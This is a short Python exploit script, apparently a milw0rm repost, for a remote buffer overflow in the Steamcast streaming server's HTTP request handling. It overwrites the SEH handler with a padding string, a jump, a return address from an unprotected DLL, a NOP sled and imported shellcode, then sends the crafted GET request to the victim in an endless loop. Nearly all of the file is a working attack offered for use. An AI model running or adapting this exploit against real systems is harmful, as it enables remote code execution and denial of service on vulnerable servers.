#!/usr/bin/python
#[*] Usage   : steamcast.py [victime_ip]
#[*] Bug     : Steamcast(HTTP Request) Remote Buffer Overflow Exploit (SEH) [1]
#[*] Founder : Luigi Auriemma, thx to overflow3r for informing me about the vuln.        
#[*] Tested on :    Xp sp2 (fr)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com,secdz.com
#[*] Chi3arona houa : Serra7 merra7,koulchi mderra7 :D
#[*] Translate by Cyb3r-1st : esse7 embe7 embou :p

#Note : The problem is that we need to find a dll wich its not compiled with GS, in my case i founded idmmbc its a loaded dll of internet download manager so try to find an unsafe dll.
import socket
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

	host = bytes(target_machine, 'utf-8')
	port = target_port

	# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
	
	exploit = b"\x41"*1003 + b"\xEB\x06\x90\x90" + b"\xDB\x27\x02\x10" + b"\x90"*20 + buf

	while 1:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		head =  b"GET / HTTP/1.1\r\n"
		head += b"Host: "+host+b"\r\n"
		head += exploit+b"\r\n"
		head += b"\r\n\r\n"

		s.send(head)

	# milw0rm.com [2009-04-13]